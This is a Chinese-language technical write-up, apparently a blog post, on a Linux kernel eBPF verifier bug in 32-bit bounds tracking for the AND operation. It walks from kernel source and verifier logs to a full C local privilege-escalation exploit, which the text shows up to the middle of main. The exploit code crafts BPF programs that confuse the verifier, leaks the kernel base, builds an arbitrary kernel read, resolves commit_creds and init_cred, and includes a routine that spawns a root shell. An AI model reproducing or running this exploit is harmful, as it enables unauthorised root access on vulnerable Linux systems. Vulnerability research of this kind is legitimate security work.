*reg)&#123;\t__update_reg32_bounds(reg);\t__update_reg64_bounds(reg);&#125;\n\n可以看到这个函数就是对dst_reg进行了两次更新边界的效果，这里主要关注32位的处理。首先将有符号的最小值赋值为有符号的最小值和真实值中的最大值，然后就是将有符号的最大值赋值为有符号的最大值和真实值中最小值。后面无符号和上述类似。\n依旧按照上面的例子来看，因为在scalar32_min_max_and函数中并没有对32位的边界值做任何初始化所以最终的效果为最小边界值为1，最大边界值为0。\nstatic void ___mark_reg_known(struct bpf_reg_state *reg, u64 imm)&#123;\treg-&gt;var_off = tnum_const(imm);\treg-&gt;smin_value = (s64)imm;\treg-&gt;smax_value = (s64)imm;\treg-&gt;umin_value = imm;\treg-&gt;umax_value = imm;\treg-&gt;s32_min_value = (s32)imm;\treg-&gt;s32_max_value = (s32)imm;\treg-&gt;u32_min_value = (u32)imm;\treg-&gt;u32_max_value = (u32)imm;&#125;/* Mark the unknown part of a register (variable offset or scalar value) as * known to have the value @imm. */static void __mark_reg_known(struct bpf_reg_state *reg, u64 imm)&#123;\t/* Clear id, off, and union(map_ptr, range) */\tmemset(((u8 *)reg) + sizeof(reg-&gt;type), 0,\t       offsetof(struct bpf_reg_state, var_off) - sizeof(reg-&gt;type));\t___mark_reg_known(reg, imm);&#125;static int adjust_reg_min_max_vals(struct bpf_verifier_env *env,\t\t\t\t   struct bpf_insn *insn)&#123;  // ... ...off_reg.type = SCALAR_VALUE;__mark_reg_known(&amp;off_reg, insn-&gt;imm);src_reg = &amp;off_reg;if (ptr_reg) /* pointer += K */  return adjust_ptr_min_max_vals(env, insn,                                 ptr_reg, src_reg);  // ... ...&#125;\n\n这段代码就是给src_reg进行了初始化，可以看到其有符号无符号最大值最小值都被赋值为了1。\n__update_reg_bounds(dst_reg);__reg_deduce_bounds(dst_reg);__reg_bound_offset(dst_reg);\n\n并且在adjust_scalar_min_max_vals函数的末尾会进行如下操作，首先又会执行__update_reg_bounds函数更新一下边界值，计算一下会发现其实结果并不会改变。不过如果此时我们再次构造一个最小边界值为0，最大边界值为1，并且运行时值为0的寄存器，再让两个寄存器相加。\nstatic void scalar32_min_max_add(struct bpf_reg_state *dst_reg,\t\t\t\t struct bpf_reg_state *src_reg)&#123;\ts32 smin_val = src_reg-&gt;s32_min_value;\ts32 smax_val = src_reg-&gt;s32_max_value;\tu32 umin_val = src_reg-&gt;u32_min_value;\tu32 umax_val = src_reg-&gt;u32_max_value;\tif (signed_add32_overflows(dst_reg-&gt;s32_min_value, smin_val) ||\t    signed_add32_overflows(dst_reg-&gt;s32_max_value, smax_val)) &#123;\t\tdst_reg-&gt;s32_min_value = S32_MIN;\t\tdst_reg-&gt;s32_max_value = S32_MAX;\t&#125; else &#123;\t\tdst_reg-&gt;s32_min_value += smin_val;\t\tdst_reg-&gt;s32_max_value += smax_val;\t&#125;\tif (dst_reg-&gt;u32_min_value + umin_val &lt; umin_val ||\t    dst_reg-&gt;u32_max_value + umax_val &lt; umax_val) &#123;\t\tdst_reg-&gt;u32_min_value = 0;\t\tdst_reg-&gt;u32_max_value = U32_MAX;\t&#125; else &#123;\t\tdst_reg-&gt;u32_min_value += umin_val;\t\tdst_reg-&gt;u32_max_value += umax_val;\t&#125;&#125;\n\n则会进入这样一个函数中，计算一下便会发现不会出现overflow的情况，所以走的都是else，那么在相加之后dst_reg的最大边界值和最小边界值都为1了。此时回到adjust_scalar_min_max_vals函数时又会调用__reg_bound_offset函数，然而经过计算可以得到的是他会将寄存器的值改为1，那么此时我们就算成功获得了一个在运行时寄存器的值为0但是在verifier中认定其值为1的寄存器了。\n利用分析不难看出来目前的情况就很类似d3bpf了，不过稍有不同的是这里运行时和verifier中的值和题目中的正好相反，不过想要构造成一摸一样的也是很简单的，(reg + 1) &amp; 1即可构造出一摸一样的情况的了。\n首先通过上述办法构造出最小边界值为1，最大边界值为0的寄存器\n#define attack(map_fd)                                                       \\    BPF_LD_MAP_FD(BPF_REG_1, map_fd),                                        \\        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \\        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),                               \\        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \\        BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, 0),                        \\        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \\        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \\        BPF_EXIT_INSN(),                                                     \\        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),                                 \\        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \\        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_8, 0),                        \\        BPF_MOV64_IMM(BPF_REG_9, 0xffffffff),                                \\        BPF_ALU64_IMM(BPF_LSH, BPF_REG_9, 32),                               \\        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_9),                        \\        BPF_MOV64_IMM(BPF_REG_7, 0x1),                                       \\        BPF_ALU64_IMM(BPF_LSH, BPF_REG_7, 32),                               \\        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 2),                                \\        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0x1),                              \\        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_7)\n\n19: (5f) r6 &amp;= r720: R0_w=invP0 R6_w=invP(id=0,umax_value=4294967296,var_off=(0x0; 0x100000000),s32_min_value=1,s32_max_value=0,u32_min_value=1,u32_max_value=0) R7_w=invP4294967298 R8_w=map_value(id=0,off=0,ks=4,vs=5376,imm=0) R9_w=invP-4294967296m\n\n最终根据前面的理论可以得到一下内容。\n#define attack(map_fd)                                                       \\    BPF_LD_MAP_FD(BPF_REG_1, map_fd),                                        \\        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \\        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),                               \\        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \\        BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, 0),                        \\        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \\        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \\        BPF_EXIT_INSN(),                                                     \\        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),                                 \\        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \\        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_8, 0),                        \\        BPF_MOV64_IMM(BPF_REG_9, 0xffffffff),                                \\        BPF_ALU64_IMM(BPF_LSH, BPF_REG_9, 32),                               \\        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_9),                        \\        BPF_MOV64_IMM(BPF_REG_7, 0x1),                                       \\        BPF_ALU64_IMM(BPF_LSH, BPF_REG_7, 32),                               \\        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 2),                                \\        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0x1),                              \\        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_7),                        \\        BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_8, 0),                        \\        BPF_JMP32_IMM(BPF_JLE, BPF_REG_3, 1, 2),                             \\        BPF_MOV64_IMM(BPF_REG_0, 0x196082),                                  \\        BPF_EXIT_INSN(),                                                     \\        BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_3),                        \\        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0x1),                              \\        BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 0x1)\n\n20: (79) r3 = *(u64 *)(r8 +0) R0_w=invP0 R6_w=invP(id=0,umax_value=4294967296,var_off=(0x0; 0x100000000),s32_min_value=1,s32_max_value=0,u32_min_value=1,u32_max_value=0) R7_w=invP4294967298 R8_w=map_value(id=0,off=0,ks=4,vs=5376,imm=0) R9_w=invP-4294967296 R1=fp0 fp-8=000021: R0_w=invP0 R3_w=invP(id=0) R6_w=invP(id=0,umax_value=4294967296,var_off=(0x0; 0x100000000),s32_min_value=1,s32_max_value=0,u32_min_value=1,u32_max_value=0) R7_w=invP4294967298 R8_w=map_value(id=0,off=0,ks=4,vs=5376,imm=0) R9_winvP-4294967296 R10=fp0 fp-8=000021: (b6) if w3 &lt;= 0x1 goto pc+2 R0_w=invP0 R3_w=invP(id=0,u32_min_value=2) R6_w=invP(id=0,umax_value=4294967296,var_off=(0x0; 0x100000000),s32_min_value=1,s32_max_value=0,u32_min_value=1,u32_max_value=0) R7_w=invP4294967298 R8_w=map_value(id=0,off=0,ks=4,vs=537,imm=0) R9_w=invP-4294967296 R10=fp0 fp-8=000022: R0_w=invP0 R3_w=invP(id=0,u32_min_value=2) R6_w=invP(id=0,umax_value=4294967296,var_off=(0x0; 0x100000000),s32_min_value=1,s32_max_value=0,u32_min_value=1,u32_max_value=0) R7_w=invP4294967298 R8_w=map_value(id=0,off=0,ks=4,vs=376,imm=0) R9_w=invP-4294967296 R10=fp0 fp-8=000022: (b7) r0 = 166310623: R0_w=invP1663106 R3_w=invP(id=0,u32_min_value=2) R6_w=invP(id=0,umax_value=4294967296,var_off=(0x0; 0x100000000),s32_min_value=1,s32_max_value=0,u32_min_value=1,u32_max_value=0) R7_w=invP4294967298 R8_w=map_value(id=0,off=0,ksm4,vs=5376,imm=0) R9_w=invP-4294967296 R10=fp0 fp-8=000023: (95) exit24: R0=invP0 R3=invP(id=0,smax_value=9223372032559808513,umax_value=18446744069414584321,var_off=(0x0; 0xffffffff00000001),s32_min_value=0,s32_max_value=1,u32_max_value=1)R6=invP(id=0,umax_value=4294967296,var_off=(0x0; 0x10000000),s32_min_value=1,s32_max_value=0,u32_min_value=1,u32_max_value=0) R7=invP4294967298 R8=map_value(id=0,off=0,ks=4,vs=5376,imm=0) R9=invP-4294967296 R10=fp0 fp-8=000024: (0f) r6 += r325: R0=invP0 R3=invP(id=0,smax_value=9223372032559808513,umax_value=18446744069414584321,var_off=(0x0; 0xffffffff00000001),s32_min_value=0,s32_max_value=1,u32_max_value=1)R6_w=invP(id=0,smax_value=9223372032559808513,umax_value=1446744069414584321,var_off=(0x1; 0xffffffff00000000),s32_min_value=1,s32_max_value=1,u32_min_value=1,u32_max_value=1) R7=invP4294967298 R8=map_value(id=0,off=0,ks=4,vs=5376,imm=0) R9=invP-4294967296 R10=fp0 fp-8=000025: (07) r6 += 126: R0=invP0 R3=invP(id=0,smax_value=9223372032559808513,umax_value=18446744069414584321,var_off=(0x0; 0xffffffff00000001),s32_min_value=0,s32_max_value=1,u32_max_value=1) R6_w=invP(id=0,smin_value=-9223372036854775806,smax_value=223372032559808514,umin_value=2,umax_value=18446744069414584322,var_off=(0x2; 0xffffffff00000000),s32_min_value=2,s32_max_value=2,u32_max_value=2) R7=invP4294967298 R8=map_value(id=0,off=0,ks=4,vs=5376,imm=0) R9=invP-4294967296 R126: (57) r6 &amp;= 127: R0=invP0 R3=invP(id=0,smax_value=9223372032559808513,umax_value=18446744069414584321,var_off=(0x0; 0xffffffff00000001),s32_min_value=0,s32_max_value=1,u32_max_value=1) R6_w=invP0 R7=invP4294967298 R8=map_value(id=0,off=0,ks=4,s=5376,imm=0) R9=invP-4294967296 R10=fp0 fp-8=000027: (95) exit\n\n这里稍微提一嘴就是这里是如何使R3达到高32位为unknown，低32为known的效果，其实也很容易想明白，这里进行了unsigned的小于等于的判断，所以可以确定低32位的值，不过因为是&lt;= 1所以最后一位也是无法确定的，所以最终.mask = 0xffffffff00000001，当然直接AND 0xffffffff00000001应该也是可以的。\n此时因为通过边界值修复了R6寄存器的var_off为1，但是运行时依旧为0所以此时只需要将R6 + 1随后AND 1那么在verifier是就会显示R6为0了，至此得到了一个运行时为1，verifier为0的寄存器了。\n综上，可得exp具体利用方法和d3bpf一致，这里不再赘述，有需要可以去看 https://cv196082.gitee.io/2023/01/06/d3bpf/\n#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;linux/userfaultfd.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/sem.h&gt;#include &lt;semaphore.h&gt;#include &lt;poll.h&gt;#include &lt;time.h&gt;#include &lt;linux/bpf_common.h&gt;#include &lt;sys/types.h&gt;#include &lt;linux/bpf.h&gt;#ifndef _BPF_DEFS_H_#define _BPF_DEFS_H_#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \\    ((struct bpf_insn)&#123;                        \\        .code = CODE,                          \\        .dst_reg = DST,                        \\        .src_reg = SRC,                        \\        .off = OFF,                            \\        .imm = IMM&#125;)#define BPF_LD_IMM64_RAW(DST, SRC, IMM)              \\    ((struct bpf_insn)&#123;                              \\        .code = BPF_LD | BPF_DW | BPF_IMM,           \\        .dst_reg = DST,                              \\        .src_reg = SRC,                              \\        .off = 0,                                    \\        .imm = (__u32)(IMM)&#125;),                       \\        ((struct bpf_insn)&#123;                          \\            .code = 0, /* zero is reserved opcode */ \\            .dst_reg = 0,                            \\            .src_reg = 0,                            \\            .off = 0,                                \\            .imm = ((__u64)(IMM)) &gt;&gt; 32&#125;)/* Memory load, dst_reg = *(uint *) (src_reg + off16) */#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \\    ((struct bpf_insn)&#123;                             \\        .code = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, \\        .dst_reg = DST,                             \\        .src_reg = SRC,                             \\        .off = OFF,                                 \\        .imm = 0&#125;)/* Memory store, *(uint *) (dst_reg + off16) = src_reg */#define BPF_STX_MEM(SIZE, DST, SRC, OFF)            \\    ((struct bpf_insn)&#123;                             \\        .code = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, \\        .dst_reg = DST,                             \\        .src_reg = SRC,                             \\        .off = OFF,                                 \\        .imm = 0&#125;)/* Conditional jumps against immediates, if (dst_reg &#x27;op&#x27; imm32) goto pc + off16 */#define BPF_JMP_IMM(OP, DST, IMM, OFF)        \\    ((struct bpf_insn)&#123;                       \\        .code = BPF_JMP | BPF_OP(OP) | BPF_K, \\        .dst_reg = DST,                       \\        .src_reg = 0,                         \\        .off = OFF,                           \\        .imm = IMM&#125;)/* Like BPF_JMP_IMM, but with 32-bit wide operands for comparison. */#define BPF_JMP32_IMM(OP, DST, IMM, OFF)        \\    ((struct bpf_insn)&#123;                         \\        .code = BPF_JMP32 | BPF_OP(OP) | BPF_K, \\        .dst_reg = DST,                         \\        .src_reg = 0,                           \\        .off = OFF,                             \\        .imm = IMM&#125;)/* Short form of mov, dst_reg = imm32 */#define BPF_MOV64_IMM(DST, IMM)              \\    ((struct bpf_insn)&#123;                      \\        .code = BPF_ALU64 | BPF_MOV | BPF_K, \\        .dst_reg = DST,                      \\        .src_reg = 0,                        \\        .off = 0,                            \\        .imm = IMM&#125;)#define BPF_MOV32_IMM(DST, IMM)            \\    ((struct bpf_insn)&#123;                    \\        .code = BPF_ALU | BPF_MOV | BPF_K, \\        .dst_reg = DST,                    \\        .src_reg = 0,                      \\        .off = 0,                          \\        .imm = IMM&#125;)/* Short form of mov, dst_reg = src_reg */#define BPF_MOV64_REG(DST, SRC)              \\    ((struct bpf_insn)&#123;                      \\        .code = BPF_ALU64 | BPF_MOV | BPF_X, \\        .dst_reg = DST,                      \\        .src_reg = SRC,                      \\        .off = 0,                            \\        .imm = 0&#125;)#define BPF_MOV32_REG(DST, SRC)            \\    ((struct bpf_insn)&#123;                    \\        .code = BPF_ALU | BPF_MOV | BPF_X, \\        .dst_reg = DST,                    \\        .src_reg = SRC,                    \\        .off = 0,                          \\        .imm = 0&#125;)/* ALU ops on immediates, bpf_add|sub|...: dst_reg += imm32 */#define BPF_ALU64_IMM(OP, DST, IMM)             \\    ((struct bpf_insn)&#123;                         \\        .code = BPF_ALU64 | BPF_OP(OP) | BPF_K, \\        .dst_reg = DST,                         \\        .src_reg = 0,                           \\        .off = 0,                               \\        .imm = IMM&#125;)/* ALU ops on registers, bpf_add|sub|...: dst_reg += src_reg */#define BPF_ALU64_REG(OP, DST, SRC)             \\    ((struct bpf_insn)&#123;                         \\        .code = BPF_ALU64 | BPF_OP(OP) | BPF_X, \\        .dst_reg = DST,                         \\        .src_reg = SRC,                         \\        .off = 0,                               \\        .imm = 0&#125;)/* Program exit */#define BPF_EXIT_INSN()             \\    ((struct bpf_insn)&#123;             \\        .code = BPF_JMP | BPF_EXIT, \\        .dst_reg = 0,               \\        .src_reg = 0,               \\        .off = 0,                   \\        .imm = 0&#125;)/* BPF_LD_IMM64 macro encodes single &#x27;load 64-bit immediate&#x27; insn */#define BPF_LD_IMM64(DST, IMM) \\    BPF_LD_IMM64_RAW(DST, 0, IMM)/* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */#define BPF_LD_MAP_FD(DST, MAP_FD) \\    BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)// varies from userspace bpf_map_info definition so need to redefinestruct bpf_map_info_kernel&#123;    __u32 type;    __u32 id;    __u32 key_size;    __u32 value_size;    __u32 max_entries;    __u32 map_flags;    char name[BPF_OBJ_NAME_LEN];    __u32 ifindex;    __u32 btf_vmlinux_value_type_id;    __u64 netns_dev;    __u64 netns_ino;    __u32 btf_id;    __u32 btf_key_type_id;    __u32 btf_value_type_id;&#125; __attribute__((aligned(8)));#endifint bpf(int cmd, union bpf_attr *attrs)&#123;    return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));&#125;int create_map(union bpf_attr *map_attrs)&#123;    return bpf(BPF_MAP_CREATE, map_attrs);&#125;int update_map_element(int fd, uint64_t key, void *value, uint64_t flags)&#123;    union bpf_attr attr = &#123;&#125;;    attr.map_fd = fd;    attr.key = (uint64_t)&amp;key;    attr.value = (uint64_t)value;    attr.flags = flags;    return bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);&#125;int lookup_map_element(int fd, uint64_t key, void *value)&#123;    union bpf_attr attr = &#123;&#125;;    attr.map_fd = fd;    attr.key = (uint64_t)&amp;key;    attr.value = (uint64_t)value;    return bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);&#125;int obj_get_info_by_fd(union bpf_attr *attrs)&#123;    return bpf(BPF_OBJ_GET_INFO_BY_FD, attrs);&#125;int map_get_next_key(union bpf_attr *attrs)&#123;    return bpf(BPF_MAP_GET_NEXT_KEY, attrs);&#125;int run_bpf_prog(struct bpf_insn *insn, uint32_t cnt, int log_level, int *prog_fd_out)&#123;    int ret = -1;    int prog_fd = -1;    char verifier_log_buff[0x200000] = &#123;0&#125;;    int socks[2] = &#123;0&#125;;    union bpf_attr prog_attrs =        &#123;            .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,            .insn_cnt = cnt,            .insns = (uint64_t)insn,            .license = (uint64_t) &quot;&quot;,            .log_level = log_level,            .log_size = sizeof(verifier_log_buff),            .log_buf = (uint64_t)verifier_log_buff&#125;;    if (NULL != prog_fd_out)        prog_fd = *prog_fd_out;    if (0 &gt;= prog_fd)        prog_fd = bpf(BPF_PROG_LOAD, &amp;prog_attrs);    if (0 &gt; prog_fd)    &#123;        puts(verifier_log_buff);        goto done;    &#125;    if (0 != socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))    &#123;        printf(&quot;dzhsb\\n&quot;);        goto done;    &#125;    if (0 != setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &amp;prog_fd, sizeof(int)))        goto done;    if (0x7 != write(socks[1], &quot;zzzzzzz&quot;, 7))        goto done;    if (log_level == 3)    &#123;        // char *each_line_log = strtok(verifier_log_buff, &quot;\\n&quot;);        // printf(&quot;%s\\n&quot;, each_line_log);        // each_line_log = strtok(NULL, &quot;\\n&quot;);        // while (each_line_log)        // &#123;        //     int len = strlen(each_line_log);        //     if (len &gt; 231)        //     &#123;        //         printf(&quot;%s\\n&quot;, each_line_log);        //         printf(&quot;%s\\n&quot;, (each_line_log + 231));        //         each_line_log = strtok(NULL, &quot;\\n&quot;);        //         continue;        //     &#125;        //     printf(&quot;%s\\n&quot;, each_line_log);        //     each_line_log = strtok(NULL, &quot;\\n&quot;);        // &#125;        puts(verifier_log_buff);    &#125;    if (NULL != prog_fd_out)        *prog_fd_out = prog_fd;    else        close(prog_fd);    ret = 0;done:    close(socks[0]);    close(socks[1]);    return ret;&#125;size_t user_cs, user_ss, user_sp, user_rflags;void save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;void err_exit(char *err_msg)&#123;    puts(err_msg);    exit(-1);&#125;void get_shell()&#123;    if (getuid())    &#123;        printf(&quot;\\033[31m\\033[1m[x] Failed to get the root!\\033[0m\\n&quot;);        exit(-1);    &#125;    printf(&quot;\\033[32m\\033[1m[+] Successful to get the root. Execve root shell now...\\033[0m\\n&quot;);    system(&quot;/bin/sh&quot;);&#125;void print_hex(char *buf, int size)&#123;    int i;    puts(&quot;======================================&quot;);    printf(&quot;data :\\n&quot;);    for (i = 0; i &lt; (size / 8); i++)    &#123;        if (i % 2 == 0)        &#123;            if (i / 2 &lt; 10)            &#123;                printf(&quot;%d  &quot;, i / 2);            &#125;            else if (i / 2 &lt; 100)            &#123;                printf(&quot;%d &quot;, i / 2);            &#125;            else            &#123;                printf(&quot;%d&quot;, i / 2);            &#125;        &#125;        printf(&quot; %16llx&quot;, *(size_t *)(buf + i * 8));        if (i % 2 == 1)        &#123;            printf(&quot;\\n&quot;);        &#125;    &#125;    puts(&quot;======================================&quot;);&#125;#define attack(map_fd, map_fd2)                                              \\    BPF_LD_MAP_FD(BPF_REG_1, map_fd),                                        \\        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \\        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                               \\        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \\        BPF_STX_MEM(BPF_W, BPF_REG_2, BPF_REG_0, 0),                         \\        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \\        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \\        BPF_EXIT_INSN(),                                                     \\        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),                                 \\        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \\        BPF_LD_MAP_FD(BPF_REG_1, map_fd2),                                   \\        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \\        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),                               \\        BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, 0),                        \\        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \\        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \\        BPF_EXIT_INSN(),                                                     \\        BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),                                 \\        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_8, 0),                        \\        BPF_MOV64_IMM(BPF_REG_4, 0xffffffff),                                \\        BPF_ALU64_IMM(BPF_LSH, BPF_REG_4, 32),                               \\        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_4),                        \\        BPF_MOV64_IMM(BPF_REG_7, 0x1),                                       \\        BPF_ALU64_IMM(BPF_LSH, BPF_REG_7, 32),                               \\        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 2),                                \\        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0x1),                              \\        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_7),                        \\        BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_8, 0),                        \\        BPF_JMP32_IMM(BPF_JLE, BPF_REG_3, 1, 2),                             \\        BPF_MOV64_IMM(BPF_REG_0, 0x196082),                                  \\        BPF_EXIT_INSN(),                                                     \\        BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_3),                        \\        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0x1),                              \\        BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 0x1),                              \\        BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x1000),                           \\        BPF_MOV64_REG(BPF_REG_7, BPF_REG_6),                                 \\        BPF_ALU64_IMM(BPF_MUL, BPF_REG_7, 0x1000 - 1),                       \\        BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_7),                        \\        BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6)static int setup_btf_bpf_prog_fd;void read_kernel(int map_fd, int map_fd2, uint64_t addr, char *buf, int len)&#123;    int i;    char values[0x1500] = &#123;0&#125;;    struct bpf_insn read_map_ops_content[] =        &#123;            attack(map_fd, map_fd2),            BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0xD0),            BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),            BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_9, 8),            BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, 0),            BPF_MOV64_IMM(BPF_REG_0, 0),            BPF_EXIT_INSN()&#125;;    for (i = 0; i &lt; len / 4; i++)    &#123;        memset(values, 0, sizeof(values));        struct bpf_map_info_kernel info = &#123;0&#125;;        union bpf_attr attr = &#123;            .info.bpf_fd = map_fd,            .info.info = (long long unsigned int)&amp;info,            .info.info_len = sizeof(info)&#125;;        *(uint64_t *)(values + 8) = addr - 0x58;        if (addr == 0)            *(uint64_t *)(values + 8) = 0;        if (0 != update_map_element(map_fd2, 0, values, BPF_ANY))            err_exit(&quot;[-] failed to update map element values!\\n&quot;);        if (0 != run_bpf_prog(read_map_ops_content, sizeof(read_map_ops_content) / sizeof(struct bpf_insn), 1, &amp;setup_btf_bpf_prog_fd))            err_exit(&quot;[-] Failed to run bpf program\\n&quot;);        if (0 != obj_get_info_by_fd(&amp;attr))            err_exit(&quot;[-] Failed to get map info\\n&quot;);        addr = addr + 4;        ((uint32_t *)buf)[i] = info.btf_id;    &#125;&#125;int main()&#123;    save_status();    union bpf_attr map_attr = &#123;        .map_type = BPF_MAP_TYPE_ARRAY,        .key_size = sizeof(int),        .value_size = 0x1500,        .max_entries = 1&#125;;    int map_fd2 = create_map(&amp;map_attr);    int map_fd = create_map(&amp;map_attr);    if (map_fd &lt; 0 || map_fd2 &lt; 0)    &#123;        printf(&quot;%d\\n&quot;, map_fd);        printf(&quot;%d\\n&quot;, map_fd2);        err_exit(&quot;Failed to create map\\n&quot;);    &#125;    char *values = malloc(0x3000);    memset(values, 0, sizeof(values));    if (0 != update_map_element(map_fd2, 0, values, BPF_ANY))        err_exit(&quot;[-] failed to update map element values!\\n&quot;);    if (0 != update_map_element(map_fd, 0, values, BPF_ANY))        err_exit(&quot;[-] failed to update map element values!\\n&quot;);    struct bpf_insn ops[] =        &#123;            attack(map_fd, map_fd2),            BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x110),            BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),            BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, 0),            BPF_ALU64_REG(BPF_ADD, BPF_REG_8, BPF_REG_6),            BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_0, 0),            BPF_EXIT_INSN()&#125;;    if (0 != run_bpf_prog(ops, sizeof(ops) / sizeof(struct bpf_insn), 2, NULL))        err_exit(&quot;[-] Failed to run bpf program\\n&quot;);    if (0 != lookup_map_element(map_fd2, 0, values))        err_exit(&quot;[-] Failed to lookup map element\\n&quot;);    uint64_t raw_array_map_ops = 0xffffffff820363a0;    uint64_t kernel_addr;    uint64_t kernel_base;    uint64_t kernel_offset;    uint64_t array_map_ops = *(uint64_t *)values;    kernel_offset = array_map_ops - raw_array_map_ops;    kernel_base = 0xffffffff81000000 + kernel_offset;    uint64_t work_for_cpu_fn_addr = kernel_offset + 0xffffffff810bc190;    uint64_t commit_creds_addr = kernel_offset + 0xffffffff810cce30;    uint64_t init_creds_addr = kernel_offset + 0xffffffff82a6b880;    printf(&quot;array_map_ops_addr =&gt; %p\\n&quot;, array_map_ops);    printf(&quot;kernel_base =&gt; %p\\n&quot;, kernel_base);    printf(&quot;kernel_offset =&gt; %p\\n&quot;, kernel_offset);    printf(&quot;work_for_cpu_fn =&gt; %p\\n&quot;, work_for_cpu_fn_addr);    printf(&quot;commit_creds_addr =&gt; %p\\n&quot;, commit_creds_addr);    printf(&quot;init_creds_addr =&gt; %p\\n&quot;, init_creds_addr);    struct bpf_insn read_map_addr_ops[] = &#123;        attack(map_fd, map_fd2),        BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x50),        BPF_ALU64_REG(BPF_SUB, BPF_REG_9, BPF_REG_6),        BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_9, 0),        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, 8),        BPF_EXIT_INSN()&#125;;    if (0 